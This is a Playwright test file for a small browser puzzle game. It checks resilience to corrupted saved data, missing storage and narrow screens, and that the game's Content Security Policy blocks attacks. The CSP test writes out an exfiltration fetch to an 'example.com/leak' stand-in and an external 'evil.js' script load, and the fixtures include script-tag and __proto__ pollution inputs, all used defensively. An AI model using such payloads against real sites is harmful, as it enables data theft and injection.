import { test, expect } from "@playwright/test";
import { openGame, saved, press, par, status, STAGE } from "./helpers.js";

// 同一オリジンの別ページからも書ける値なので、何が入っていても起動できること
const 壊れた保存値 = {
  "負の到達面": saved({ reached: -5 }),
  "範囲外の到達面": saved({ reached: 9999 }),
  "知らない版": JSON.stringify({ v: 99, reached: 3 }),
  "配列が入った集計": saved({ totals: [1, 2, 3] }),
  "許可外の目印と配色": saved({ marks: "<script>", pal: "neon", level: 99 }),
  "__proto__ 混入": '{"v":2,"reached":0,"__proto__":{"polluted":1}}',
  "壊れた JSON": "{not json",
  "空文字": "",
};

for (const [name, value] of Object.entries(壊れた保存値)) {
  test(`保存値が壊れていても遊べる: ${name}`, async ({ page }) => {
    const errors = [];
    page.on("pageerror", e => errors.push(String(e).split("\n")[0]));
    await page.goto("/index.html");
    await page.evaluate(v => localStorage.setItem("inktrio.v1", v), value);
    await page.reload();

    await expect(page.locator("#board .cell")).toHaveCount(25);
    await expect(par(page)).not.toHaveText("—");
    await expect(page.locator("#tallyList > *")).toHaveCount(18, "記録欄まで描き切る");
    await expect(page.locator("#proof .cell.lit").first()).toBeVisible();
    expect(errors).toEqual([]);
  });
}

test("保存領域が使えなくても遊びは止まらない", async ({ page }) => {
  const errors = [];
  page.on("pageerror", e => errors.push(String(e).split("\n")[0]));
  await page.addInitScript(() => {
    Object.defineProperty(window, "localStorage", {
      get() { throw new Error("この環境では使えない"); },
    });
  });
  await page.goto("/index.html");

  await expect(par(page)).toHaveText("1");
  await press(page, 12);
  await expect(status(page)).toContainText("刷り上がりました", "遊べる");

  await page.click("#opts");
  await expect(page.locator("#saveInfo")).toHaveText("この環境では保存できません");
  await expect(page.locator("#wipe")).toBeDisabled();
  await expect(page.locator("#tallyNote")).toContainText("記録を保存できません");
  expect(errors).toEqual([]);
});

test("CSP が外部への送信と外部スクリプトを塞ぐ", async ({ page }) => {
  await openGame(page, {});

  const exfil = await page.evaluate(async () => {
    try { await fetch("https://example.com/leak", { mode: "no-cors" }); return "通った"; }
    catch { return "遮断"; }
  });
  expect(exfil, "default-src 'none' が connect を塞ぐ").toBe("遮断");

  const external = await page.evaluate(() => new Promise(resolve => {
    const s = document.createElement("script");
    s.src = "https://example.com/evil.js";
    s.onload = () => resolve("読み込まれた");
    s.onerror = () => resolve("遮断");
    document.head.appendChild(s);
  }));
  expect(external, "script-src 'self' が外部スクリプトを塞ぐ").toBe("遮断");

  const inline = await page.evaluate(() => {
    const s = document.createElement("script");
    s.textContent = "window.__injected = true";
    document.head.appendChild(s);
    return !!window.__injected;
  });
  expect(inline, "script-src から 'unsafe-inline' を外してある").toBe(false);
});

test("モジュールと外部スタイルシートがすべて読み込まれる", async ({ page }) => {
  const game = await openGame(page, {});
  const loaded = await page.evaluate(() => performance.getEntriesByType("resource")
    .map(e => e.name.replace(location.origin + "/", ""))
    .filter(n => /^src\/|^styles\.css$/.test(n)).sort());
  expect(loaded).toEqual([
    "src/audio.js", "src/daily.js", "src/game.js", "src/main.js",
    "src/palette.js", "src/puzzles.js", "src/pwa.js", "src/rules.js",
    "src/rush.js", "src/share.js", "src/storage.js", "src/tally.js",
    "src/view.js", "styles.css",
  ]);
  await expect(page.locator("style")).toHaveCount(0, "インラインの style タグは残していない");
  await game.expectClean();
});

test("狭い画面でも横スクロールは出ない", async ({ page }) => {
  await page.setViewportSize({ width: 320, height: 640 });
  const game = await openGame(page, { reached: STAGE.三つの重なり });
  const overflow = await page.evaluate(() =>
    document.documentElement.scrollWidth - document.documentElement.clientWidth);
  expect(overflow).toBeLessThanOrEqual(0);
  await game.expectClean();
});
